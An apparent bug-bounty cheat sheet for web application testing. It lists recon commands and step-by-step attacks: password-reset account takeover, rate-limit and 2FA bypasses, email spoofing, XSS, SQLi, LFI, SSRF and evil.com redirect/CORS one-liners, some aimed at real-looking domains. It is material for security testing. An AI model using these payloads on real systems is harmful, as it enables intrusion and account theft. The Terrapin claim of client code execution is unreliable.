**1. Web Application Security Testing**

**Information Gathering**
* https://dorks.faisalahmed.me/#
* https://taksec.github.io/google-dorks-bug-bounty/
* https://mr-koanti.github.io/github
* https://mr-koanti.github.io/shodan
* https://www.lopseg.com.br/osint
* https://web.archive.org/web/*/shippit.com*

**Technology and Framework Fingerprinting**
* https://builtwith.com/
* https://whatcms.org/
* https://sitereport.netcraft.com/
* https://github.com/urbanadventurer/WhatWeb

**Fingerprint Web Server**
* Wappalyzer Extension
* Netcraft Website
* Banner Grabbing using burpsuite
* Web Server Error Message
* Use Automated tools like NMAP, NIKTO
* curl -I -L https://demo.testfire.net/ 

**Review Webserver Metafiles for Information Leakage**
* Visit robots.txt in the targeted website.
* Visit sitemap.xml in the targeted website.

**Review Webpage Comments and Metadata for Information Leakage**
* Testers should look for HTML comments which start with &lt;!--.

**2. Configuration and Deployment Management Testing**



**Subdomain Enumeration**
* subfinder -d example.com >>subdomains.txt
* assetfinder -subs-only example.com >>subdomains.txt
* findomain -t exapmle.com >>subdomains.txt
* python3 sublist3r.py -d example.com -o subdomains.txt
* httpx -l subdomains.txt >>live_subdomains.txt
* https://subdomainfinder.c99.nl/

**Vulnerability Scanning using Nuclei**
* nuclei -l live_subdomains.txt -o nuclei_reslut.txt
* nuclei -l live_subdomains.txt -rl 3 -c 2 -o nuclei_reslut.txt
* subfinder -d target.com -all | httpx | nuclei -t ~/nuclei-templates
* https://blog.projectdiscovery.io/ultimate-nuclei-guide

**Subdomain Takeover**
* subzy run --targets live_subdomains.txt
* nuclei -l live_subdomains.txt -t ~/nuclei-templates/http/takeovers/

**Port Scan and Service discovery**
* nmap -iL without_https.txt -sV

**Finding json files**
* subfinder -d target.com -all | httpx | waybackurls | grep -E ".json(onp)?$"

**Origin ip Disclosure**
* https://www.shodan.io/
* https://search.censys.io
* https://securitytrails.com
* https://en.fofa.info/
* https://medium.com/@pruthu.raut/hunting-for-origin-ip-a-beginners-guide-70235f3dd415

**Broken Link Hijacking**
* Manually open all subdomain to find and click external links on the subdomains to verify.
* python3 BLH.py https://www.example.com/
* blc -rof --filter-level 3 https://example.com/

**Mail Server Misconfiguration**
* Now Email Spoofing happens due to two main reasons :
1. SPF record not set for the particular email
2. Missing of DMARC protocol for the particular email
* Go to your target company and collect all the possible emails of that company
* Now check the SPF and DMARC record of all the emails : https://mxtoolbox.com/
* Now if you get an email (xyz@company.com), then go for its exploitation
* Visit https://emkei.cz/ in order to exploit the issue
* Here you’ll need to fill From-email, To and Subject
* In From-email add the company’s email and in To add your own email and in Subject you can add anything (like Hacking You, Bounty Time etc.)
* Check your inbox and you’ll get the email from that company which was sent by you

## SIGNUP PAGE VULNERABILITIES 

**No Rate Limit at Signup Page**
* Enter your details in signup form and submit the form
* Capture the signup request and send it to intruder
* add $$ to email parameter
* In the payload add different email address
* Fire up intruder and check whether it return 200 ok

**Hyper Link Injection Vulnerability**
* Go to https://target.com/ and create account  with the first name http://attacker.com/ and last name.
* Now check  your email  and you notice there is malicious hyperlinks.
* Hyperlink Injection in Friend Invitation Emails.
* A user can change their name to a URL in order to send email invitations containing malicious hyperlinks.

**Server Side Template Injection on Name parameter during Sign Up process**
* Navigate to the Singup page.
* Now, in the First Name field, enter the value {{7*7}}
* Fill in the rest of the values on the Register page and register your account.
* We have used the payload {{7*7}} here to verify that it is being evaluated at the backend.
* Now, wait for the welcome/promotional email to arrive in your Inbox.
* Notice that the email arrives with the Subject as 49.
* Try all input fields. 

**Reflected XSS on Signup Page and Login page**
* Go to https://example.com/signup
* Just fill up the signup form and don't submit.
* Open burp suite captures the submit request.
* Change the value of email parameter from a valid email address to <img src=xonerror=alert(document.domain)>
* Forward the request and turn the intercept off.
* Go to browser check.
* Payload for Username field : <svg/onload=confirm(1)>
* Payload for Email field : a7madn1@gmail.com'\"><svg/onload=alert(/xss/)>, “><svg/onload=confirm(1)>”@x.y

## PASSWORD RESET PAGE VULNERABILITIES 

**No Rate Limiting on Password Reset functionality**
* Find the reset password page on the web application.
* Enter the email then click reset password
* Intercept this request in burp suite..
* Send it to the intruder and repeat it 50 times.
* You will get 200 OK status.

**Account takeover by password reset functionality**
* email= victim@gmail.com&email=attacker@gmil.com
* email= victim@gmail.com%20email=attacker@gmil.com
* email= victim@gmail.com |email=attacker@gmil.com
* email= victim@gmail.com%0d%0acc:attacker@gmil.com
* email= victim@gmail.com&code= my password reset token

**Denial of service when entering a long password**
* Go Sign up page and Forgot password page
* Fill the form and enter a long string in password
* Click on enter and you’ll get 500 Internal Server errors if it is vulnerable.
* Reference link - https://hackerone.com/reports/840598, https://hackerone.com/reports/738569 

**Password reset token leakage via referrer**
* Go to the target website and request for password reset.
* Now check your email and you will get your password reset link.
* Click on any social media link you see in that email and password reset page.
* Don't change the password before clicking on any external links like social media links for the same website.
* Capture that request in burp suite, You will find a reset token in the referer header.

**Reset password link sent over unsecured http protocol**
* Go to the target website and request a password reset.
* Check email, you will get a reset password link.
* Copy that link paste in the notepad and observe the protocol.

**Password Reset Token Leak via X-Forwarded-Host**
* Intercept the password reset request in Burp Suite
* Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com.
* Forward the request with the modified header.
* Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN.

**Password Reset Link not expiring after changing password**
* First You need to create an account with a Valid Email Address.
* After Creating An Account log out from your Account and Navigate to Forgot Password Page.
* Request a Password Reset Link for your Account.
* Use The Password Reset Link And Change The Password, After Changing the Password Login to Your Account.
* Now Use The Old Password Reset Link To Change The Password Again.
* If You Are Able to Change Your Password Again Then This Is a Bug.

**Password Reset Link not expiring after changing the email**
* Send the password reset link to your email.
* Don`t open the password link, just copy it and paste into any editor, Open your account.
* Go to your account settings. Under account, you will see Account Overview.
* Go to the Email and password Option and change the email and verify it.
* After changing the email go to your password reset link which you copied.
* Change your password.

**insufficient validation in password reset tokens.**
* Create two accounts: one for the attacker and one for the victim.
* Go to the target website and request a password reset for the victim's account.
* Open the password reset link sent to the victim's email.
* Change the token in the URL with the attacker's token.
* Check if you are able to change the victim's password using the modified token.
* If successful, this indicates a security flaw or bug in the system.

**No Rate Limit On Login With Weak Password Policy**
* Create an account with a weak password.
* Log in with your account.
* Capture the request in BurpSuite.
* Send the captured request to Intruder.
* Set payload position in the password field.
* Attempt to brute force the password.
* If successful, the victim's password will be cracked.

**No Rate Limit on Username field**
* Go the url and login
* go to user settings and edit name as attacker
* capture the request in burp.
* send that post request to intruder
* By selecting 100 null paylaods send this post request to server 100 times
* i successfully hit the server 100 times and changed the username 100 times
* there is some limit to change the username/password/email

**No Rate Limit on comments, adding user (where you need to send an invite email), sending GIFs or messages, sending OTPs etc.**
* Go to any endpoint where you can comment or you can send messages etc.
* Now make a comment and intercept the request using burp suite
* Send that request to intruder and click on clear
* Select the comment you made and click on add
* Now to payload section and you can simply add a payload file which contains various words or you can use “Add from list option”
* Click on start attack
* Refresh the page and you’ll find the flood
* Refferance: https://shahjerry33.medium.com/no-rate-limit-2k-bounty-642720ffba99

**No Rate Limit on when Adding Comment**
* Go to any post.
* Turn on Intercept and add a comment.
* Send the request to Intruder.
* Set your payloads and start the attack.
* Observe that there is no rate limit.

**Self-XSS on Password Reset Page**
* Go to https://target.com/forgot-password and initiate the password reset process.
* Enter the email address where you received the password reset link.
* Open your mailbox and click on the password reset link you received.
* On the password reset page, replace the current password with "><img src=x onerror=prompt(document.domain)> and submit the form.
* Wait for the XSS payload to execute.

## RATE LIMIT BYPASS TECHNIQUES

**1. Using different parameter**
* suppose rate limit is on signup, try to use - sign-up, Sign-up, SignUp, try for password reset and email conformation. 

**2. Customizing HTTP Methods**
* If the request goes on GET try to change it to OPTION, GET, HEAD, POST, PUT, DELETE, TRACE, CONNECT.
* If you wanna bypass the rate-limit in API's try HEAD method.

**3. Try for null payloads**

**4. Using Null Characters**
* Null payloads: %00, %0d%0a, %09, %0C, %20, %0, %00, %00%00, %00%00%00, %00%00%00%00, %00%00%00%00%00, %20, %09, %0d and %0a.
* For example, test@email.com%00 and add null payloads in session and cookie headers.

**5. Adding HTTP Headers to Spoof IP and Evade Detection**
* X-Forwarded: 127.0.0.1
* X-Forwarded-By: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Forwarded-For-Original: 127.0.0.1
* X-Forwarder-For: 127.0.0.1
* X-Forward-For: 127.0.0.1
* Forwarded-For: 127.0.0.1
* Forwarded-For-Ip: 127.0.0.1
* X-Custom-IP-Authorization: 127.0.0.1
* X-Originating-IP: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1
* rate limiting bypass payloads: https://github.com/blackangl1/bypass-rate-limit-payloads/blob/main/payload.txt

**6. Case sensitiveness**
* Rate limit in: victim@gmaii.com email address
* Rate limit bypass : Victim@gmaii.com, and 10 more request
* Rate limit bypass : VIctim@gmaii.com and 10 more request
* Rate limit bypass : VICtim@gmaii.com …..
* Rate limit bypass : VICTim@gmaii.com ………
* Rate limit bypass : VICTIm@gmaii.com …..
* Rate limit bypass : VICTIM@gmaii.com and many more

**7. bypass the rate limit protection on the Forgot Password feature using the X-Forwarded-For header**
* Navigate to the Forgot Password page of the target website.
* Submit a password reset request using your email address.
* capture the Forgot Password request in burpsuite.
* Looped the request 50 times, from 127.0.0.1 till 127.0.0.50 (value of the X-Forwarded-For header).
* Check the responses to ensure that the rate limit is being bypassed and that each request is processed as if it came from a different IP address.

## CAPTCHA BYPASS TECHNIQUES

**1. Reuse Previous Captcha:** 
* This technique involves using a captcha code that you’ve seen or solved before, assuming that the same code will work again multiple times.

**2. Submit Empty Captcha:** 
* Trying to bypass the captcha by leaving the captcha field empty when submitting a form.

**3. Alter Data Format:** 
* Changing the format in which data is sent to the server, such as converting it to JSON or plain text, in the hope that the captcha won’t be validated.

**4. Change Request Method:**
* Create a new request by entering right captcha value.
* Intercept the request in a proxy tool.
* The request will look like this:
* Now change the method from POST to PUT and right submit the request.

**5. Manipulate Headers:** 
* Using custom headers like X-Forwarded-For, X-Remote-IP, X-Original-IP, X-Remote-Addr, etc., to make it appear as though the requests are coming from different IP addresses, thereby avoiding captcha validation.

6. CAPTCHA bypass will be possible by changing the response parameter values from false to true.

7. CAPTCHA bypass will be possible by manipulating the response message for ex. Changing the CAPTCHA is invalid to CAPTCHA is valid.    

**8. Null Payloads:**
* Went to Forget Password and filled details along with Captcha
* Captured Request with Burp Proxy.
* Neither turned off Interception nor Forwarded the Request.
* Sent Request to Intruder and played 300 times with null payloads.
* Success!!Captcha mechanism was validating the initial request which was on hold with Proxy before expiring the captcha.

**Failed Captcha verification**
* Open your browser and navigate to the login page of the web application you want to test.
* In the login form, enter a valid email address and an incorrect password.
* Submit the form.
* Repeat this step multiple times to observe the web application's behavior.
* Attempt to log in again with the valid email address and incorrect password while the CAPTCHA is present.
* Burp Suite will capture this login request.
* Check if the server accepts the modified request and logs you in without verifying the CAPTCHA.

## EMAIL VERIFICATION BYPASS 

**Email verification bypass after signup**
* Sing up on the web application as attacker@mail.com
* You will receive a confirmation email on attacker@mail.com, do not open that link now.
* The application may ask for confirming your email, check if it allows navigating to the account settings page.
* On the settings page check if you can change the email.
* If allowed, change the email to victim@mail.com.
* Now you will be asked to confirm victim@mail.com by opening the confirmation link received on victim@mail.com, instead of opening the new link go to attacker@mail.com inbox and open
* the previous received link.If the application verifies vitim@mail.com by using previous verification link received on attacker mail, then this is an email verification bypass.

**Email Authentication Bypass account registration process**
* created an account with attacker@gmail.com, upon registration you will receive an email verification link.
* Click the link and verify attacker account.
* Next, I went into the Edit profile and changed the Email to victim@gmail.com.
* after change the email you logged out of attacker account, you will receive a message “A verification email has been sent to the new updated email.
* I just went into attacker@gmail.com mail, and clicked on the same link which was sent to me during my initial registration process.
* Now I just went into the login page and entered the Email as attacker@gmail.com and attacker account password, successfully bypassed email authrntication.

**Email Verification code bypass in account registration process**
* First visit your website on the sign up page.
* Enter your email and create a password.
* Enter name and mobile phone, then sign up.
* Then request for verification code on email.
* Enter wrong verification code and intercept requests using Burp suite.
* After intercepting the request, I changed the status from "False" to "True". {"status":false to "status":true}
* Boom!! Verification code bypassed.
* Finally, the account was created with the wrong verification code.
* Reference Link: https://hackerone.com/reports/1406471 https://hackerone.com/reports/1181253 

**Email Verification Bypass leads to account takeover**
* Try registering any email address without verifying it.
* Try registering an account again, but this time with a different method, such as ‘sign up with Google’ from the same email address.
* see it will successfully bypass the Email verification methods.
* What happens here is, now the attacker can easily log in using the victim's account which bypasses the verification methods.
* Reference: https://hackerone.com/reports/1074047 

**Email Verification Bypass by brute forcing Attack**
* Attacker creates a account with victim's email ID Ex: victim@gmail.com
* Now he doesn't know the verification code.
* Attackers will start brute force attacks to get the correct verification code.
* Once the Attacker gets the verification code.
* Finally, the account was created using victim Email.
* Reference Link; https://hackerone.com/reports/1394984 https://hackerone.com/reports/64666 

## TWO FACTOR AUTEHTICATION BYPASS 

**OTP Bypass on Register account via Response manipulation**
* Register account with mobile number and request for OTP.
* Enter incorrect OTP and capture the request in Burp Suite.
* Do intercept response to this request and forward the request.
* response will be {"verificationStatus":false,"mobile":9072346577","profileId":"84673832"}
* Change this response to {"verificationStatus":true,"mobile":9072346577","profileId":"84673832"}     

**OTP Bypass Second Method**
* Go to login and wait for OTP pop up.
* Enter incorrect OTP and capture the request in Burp Suite.
* Do intercept response to this request and forward the request. response will be error
* Change this response to success, And forward the response, You will be logged in to the account.

**Third Method**
* Register 2 accounts with any 2 mobile number(first enter right otp)
* Intercept your request click on action -> Do intercept -> intercept response to this request.
* check what the message will display like status:1
* Follow the same procedure with other account but this time enter wrong otp
* Intercept response to the request, See the message like you get status:0
* Change status to 1 i.e, status:1 and forward the request if you logged in means you just did an authentication bypass.

**OTP Bypass - Developer’s Check**
* Open your web browser and navigate to the target website that has an OTP-based login or registration process.
* Find the option to register or log in. This usually involves entering your phone number or email address to receive an OTP.
* Once you are on the page where you need to enter the OTP, right-click on the "Continue" or "Submit" button.
* Look for any JavaScript functions associated with the button. You might find an onclick event or other event handlers, Specifically, look for a function related to OTP validation, such as checkOTP(event).
* The console may provide a link to the source code where the function is defined, The OTP might be hardcoded or visible in the JavaScript code, allowing you to see the OTP that was sent to the mobile number.
* https://shahjerry33.medium.com/otp-bypass-developers-check-5786885d55c6

## SESSION MANAGEMENT RELATED VULNERABILITIES 

**Session Hijacking**
* Create your account.
* Login your account.
* Use cookie editor extension in browser.
* Copy all the target cookies and Logout your account.
* Paste that cookie on another browser in the cookie editor extension.
* Refresh page if you are logged in then this is a session hijacking.

**Old Session Does Not Expire After Password Change
Old Session Does Not Expire After Email change
Old Session Does Not Expire After 2FA Enabled
Old Session Does Not Expire After 2FA Enabled
Old Session Does Not Expire After Account Delete**
* Create an account on the target site.
* Log in to your account using two different browsers with the same account (Chrome and Firefox).
* Change your password in the Chrome browser.
* Refresh the Firefox browser.
* If you are still logged in, then this indicates a bug.

## CROSS SITE SCRIPTING VULNERABILITIES 

* waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
* gospider -S live_subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
* waybackurls http://example.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox file XSS.txt
* echo target | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
* cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
* waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
* echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
* echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

**New Way To Find Simple Cross site scripting (xss)!!!**
* I visit example.com and I see there is a chat system on the right side of the website.
* I clicked on other information and they asked me to enter my full name. I put payload <img src=1 onerror=alert(1)> email i put a contact number also and then click to process and BOOM !!!


## OPEN REDIRECTION VULNERABILITY 

**First method**
* Go to https://www.private.com
* Capture the request in the burp suite
* Send this request to intruder
* Set payload after domain directly For ex: private.com/$test$
* Replace $text$ with your open redirect payloads.
* Add all open redirect payloads in the intruder
* Click on Start attack, Check for 301 response
* Payloads link: https://medium.com/@cyb3rD1vvya/open-redirection-b6c2505f1f44 

**Second Method**
* If the Application has a user Sign-In/Sign-Up feature, then register a user and log in as the user.
* Go to your user profile page , for example : samplesite.me/accounts/profile
* Copy the profile page's URL, Logout and Clear all the cookies and go to the homepage of the site.
* Paste the Copied Profile URL on the address bar.
* If the site prompts for a login , check the address bar , you may find the login page with a redirect parameter like the following, https://samplesite.me/login?next=accounts/profile,
* https://samplesite.me/login?retUrl=accounts/profile
* Try to exploit the parameter by adding an external domain and load the crafted URL eg:- https://samplesite.me/login?next=https://evil.com/ (or) https://samplesite.me/login?next=https://samplesite.me@evil.com/ #(to beat the bad regex filter)
* If it redirects to evil.com , there's your open redirection bug.
* Try to leverage it to XSS eg:- https://samplesite.me/login?next=javascript:alert(1);//

**Open Redirect to XSS**
* Open your browser and go to the login page: https://example.com/login.
* In the address bar, modify the URL to include the redirect parameter with the payload: https://example.com/login?redirect=http://;@google.com.
* Press Enter and observe if you are redirected to http://google.com.
* If you are successfully redirected to http://google.com, this confirms the open redirect vulnerability.
* Change the redirect URL to test for XSS: https://example.com/login?redirect=javascript:alert(1).
* Press Enter to navigate to this URL.
* If the application is vulnerable, after logging in, the JavaScript payload will execute, resulting in an alert pop-up displaying 1.
* payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
* waybackurls vulnweb.com | grep -a -i =http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
* subfinder -d target.com | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect-generic.yaml -l open.txt
* nuclei -l open.txt -t ~/nuclei-templates/dast/vulnerabilities/redirect/open-redirect.yaml

## CROSS SITE REQUESR FORGERY(CSRF)

**Common flaws in CSRF token validation**
* Interact with the application functionality and intercept the request using a proxy tool.
* Send this request to the repeater and right-click to change the request method from POST to GET.
* Generate a CSRF proof of concept (POC) and modify it according to your preferences.
* Ethically deliver the manipulated request to the victim, demonstrating the potential impact of the CSRF vulnerability.

**Validation of CSRF token depends on token being present**
* Interact with the application functionality and intercept the request using a proxy tool.
* Send this request to the repeater.
* Remove the entire CSRF token parameter from the request and right-click to generate a CSRF POC.
* Customize the CSRF POC according to your preferences.
* Ethically deliver the manipulated request to the victim, illustrating the CSRF vulnerability's exploitability.

**CSRF token is not tied to the user session**
* Interact with the application functionality and intercept the request using a proxy tool.
* Copy a valid CSRF token associated with your own session and drop the intercepted request.
* Right-click to generate a CSRF POC using the copied valid token.
* Customize the CSRF POC according to your preferences.
* Ethically deliver the manipulated request to the victim, showcasing the CSRF vulnerability's impact.

**CSRF Token Tied to a Non-Session Cookie**
* Interact with the application functionality and intercept the request using a proxy tool.
* Right-click to generate a CSRF proof of concept (POC).
* Remove any cookie value from the intercepted request.
* Customize the CSRF POC according to your preferences.
* Ethically deliver the manipulated request to the victim, highlighting the impact of the CSRF vulnerability.

**Bypassing Referrer-based CSRF defenses**
* Intercept the request and attempt to change the referrer header to a different domain.
* If changing the referrer header is ineffective, suppress the referrer header using techniques like <meta name="referrer" content="no-referrer">.
* Generate a normal proof of concept (POC) using the chosen technique.
* Ethically deliver the manipulated request to the victim, demonstrating the circumvention of Referrer-based CSRF defenses.

**Send null value in CSRF token**
* Interact with the application functionality and intercept the request using a proxy tool.
* Send this request to the repeater.
* Replace the CSRF token value with a null value and generate a CSRF POC.
* Customize the CSRF POC according to your preferences.
* Ethically deliver the manipulated request to the victim, showcasing the vulnerability exploited by sending a null CSRF token.

**Change CSRF value and add same-length string**
* Interact with the application functionality and intercept the request using a proxy tool.
* Send this request to the repeater.
* Modify the CSRF token value by adding a string of the same length and generate a CSRF proof of concept (POC).
* Customize the CSRF POC according to your preferences.
* Ethically deliver the manipulated request to the victim, highlighting the exploitability of changing the CSRF value while maintaining its length.

**CSRF Bypass tips**
* Change Request Method POST to GET
* Remove Total Token Parameter\
* Remove The Token, And Give a Blank Parameter
* Copy a Unused Valid Token , By Dropping The Request and Use That Token
* Use Own CSRF Token To Feed it to Victim
* Replace Value With Of A Token of Same Length
* Reverse Engineer The Token
* Extract Token via HTML injection
* Switch From Non-Form Content-Type: application/json or Content-Type: application/x-url-encoded To Content-Type: form-multipart
* Change/delete the last or first character from the token
* Change referrer to Referrer

**Web Cache Poisoning chain to HTMl Injection, Open Redirection and XSS**
* Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server. 
* You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. 
* Param Miner use to automate the process of identifying unkeyed inputs by adding the Param Miner extension to Burp from the BApp store.
* To use Param Miner, you simply right-click on a request that you want to investigate and click Guess headers.
* If you’re using Burp Suite Pro, identified parameters will be reported as scanner issues. If not, you can find them listed under Extender->Extensions->Param Miner->Output.
**Elicit a harmful response from the back-end server**
* Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful  response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. 
* Refferance: https://amsghimire.medium.com/web-cache-poisoning-1558f2aa41ef, https://0xn3va.gitbook.io/cheat-sheets/web-application/web-cache-poisoning































**SERVER SIDE TEMPLATE INJECTION ( EASILY FOUND )**
* I visit Example.com and I see there is a chat system on the right side of the website.
* I clicked on I’m interested they ask me to enter my email i put victim email id there and then they ask me for my first name i put SSTI basic Payload {{7*7}} and same as I entered this in my last name and after some time almost half an hour I received an email like this BOOM !! You can see there is HEY , 49 And i enter {{7*7}} payload so it means 7*7 is 49 and here it is work.
* tplmap -u 'http://www.target.com/page.php?id=1'











**Insecure direct object references (IDOR)**
* Register and log in with your credentials.
* Give Your email id in Newsletter for further updates.
* go to mail, which was sent by Redacted.com and click the unsubscribe.
* You will get the following parameters: https://Redacted.com/account/en-GB/unsubscribe/confirmation?a=a3a4b8d7–94fe-4c73-ba3.
* Before clicking the unsubscribe button turn on the burp suite, capture the request and check the post and GET requests parameters like name, and Email.
* In my case, it was the GET request https://Redacted.com/account/en-GB/unsubscribe/confirmation?a=a3a4b8d7–94fe-4c73-ba32-b25c&e=attacker@gmai1.com.
* Now change the email address attacker@gmail.com to victim@gmail.com. By doing so, I was successfully able to unsubscribe the victim’s email address.

**IDOR To view other private users profile pictures**
* Log in to the application and go to the profile picture upload section of your user account.
* Upload a valid image file, Confirm that the profile picture is successfully uploaded and displayed on your profile.
* Open your profile picture in a new tab and observe the URL structure: https://un.org/profile/123456/default-pic/pictures-12343544.
* Modify the '123456' segment in the URL to another user ID, such as https://un.org/profile/123457/default-pic/pictures-12343544.
* Observe that changing this segment displays the profile picture of the user with the ID 123457

**Information Disclosure - WordPress**
* Go to any website that uses wordpress CMS (You can identify website technologies using wappalyzer).
* Right click on any image and click on view image.
* Now the following page will appear which will be having the URL : https://www.website.com/wp-content/uploads/2019/08/photo.png.
* Now edit the URL like https://www.webiste.com/wp-json/wp/v2/users.
* Disclose the wordpress username.



**Privilege Escalation**
* Go to your target website that is using WordPress CMS
* Use the wpscan tool to check for the out-dated plugins, themes, default credentials etc.
* My command : wpscan --url https://target.com --disable-tls-check --enumerate u
* After the scan is completed you’ll get the result of out-dated and vulnerable things.
* In my case it was vulnerable to “WP Support Plus Responsive Ticket System”
* Referance: https://shahjerry33.medium.com/privilege-escalation-hello-admin-a53ac14fd388


**Contant Discovery**
* dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u https://agrevolution.in/ --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o dirsearch.txt
* feroxbuster -u https://targer.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
* ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,403,301,302 -c true -v -o ffuf.txt

**Javascript file Vulnerability**
* cat live_subdomains.txt | katana | grep js >>js.txt
* cat live_subdomains.txt | subjs | grep js >>js.txt
* httpx -l js.txt >>live_js.txt
* cat live_js.txt | mantra and cat live_js.txt | nipejs
* nuclei -l live_js.txt -t ~/nuclei-templates/http/exposures/ -o js_bugs.txt


**SQL Injection Vulnerability**
* subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
* echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt ; python3 /home/infosec/SQLiDetector/sqlidetector.py -f wayback_urls_for_target.txt
* findomain -t vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1

**Time based SQL Injection**
* waybackurls http://testphp.vulnweb.com/ | grep -E '\bhttps?://\S+?=\S+' | grep -E '.php|.asp' | sort -u | sed 's/(=[^&]*)/=/g' | tee urls.txt | sort -u -o urls.txt
* cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'

**SQLi- Authentication Admin Panel Bypass**
* Go admin login page
* Now enter the payload in the username or password field,
* Payload Used: admin’ or ‘1’=’1'#
* Enter the payload and click the submit button. You Login successfully…
* Payload URL: https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
* Wordlist: https://github.com/p0dalirius/webapp-wordlists/tree/main 

**Test for SSRF**
* findomain -t http://testphp.vulnweb.com/ -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net

**Local File Inclusion(LFI)**
* waymore.py -i vulnweb.com --no-subs -mode U -oU urls.txt
* cat urls.txt | uro | sed 's/=.*/=/' | gf lfi | nuclei -tags lfi
* httpx -l subdomains.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'

**Path Traversal**
* Go to https://www.private.com.
* Capture the request in the burp suite.
* Send this request to intruder.
* Set payload after domain directly For ex: private.com/$test$.
* Replace with path traversal payloads and check the response.



**Cross Origin Resource Sharing(CORS) Misconfiguration**
* site="http://testphp.vulnweb.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url;else echo Nothing on "$url";fi;done
* https://github.com/chenjj/CORScanner - python cors_scan.py -i live_subdomains.txt -t 100
  
**Check for LDAP Anonymous Login Vulnerability**
* nmap -sV -p 389,636 -iL without_https.txt
* nuclei -id ldap-anonymous-login -l without.https.txt -o ldap.txt
* nmap -n -Pn --script "ldap* and not brute" example.com (**Use Nmap to Exploit this Vulnerability**)
* Referance - https://hackerone.com/reports/2081332

**Terrapin Attack CVE-2023-48795**
* Discover open ports using nmap -sV ws.p2pb2b.com.
* Identify port 22 open, running the service OpenSSH 7.4 with protocol version 2.0.
* Perform an ssh2-enum-algos scan using nmap to identify supported encryption and MAC algorithms (nmap --script ssh2-enum-algos ws.p2pb2b.com -sV -p 22)
* Identify the presence of the chacha20-poly1305@openssh.com encryption algorithm and MAC algorithm suffixed with umac-128-etm@openssh.com
* Exploit the CVE-2023-48795 vulnerability using the Terrapin-Scanner tool, which leverages the discovered weakness in the SSH banner handling mechanism to execute arbitrary code on the client system (https://github.com/RUB-NDS/Terrapin-Scanner, ./terrapin-scanner -connect ws.p2pb2b.com:22 -json)

**Bug Bounty Wordlist**
* https://github.com/Karanxa/Bug-Bounty-Wordlists
* https://github.com/danielmiessler/SecLists/
* https://github.com/zapstiko/wordlists
* https://github.com/aufzayed/bugbounty
* https://github.com/payloadbox/sql-injection-payload-list
* https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/
* https://github.com/EdOverflow/bugbounty-cheatsheet
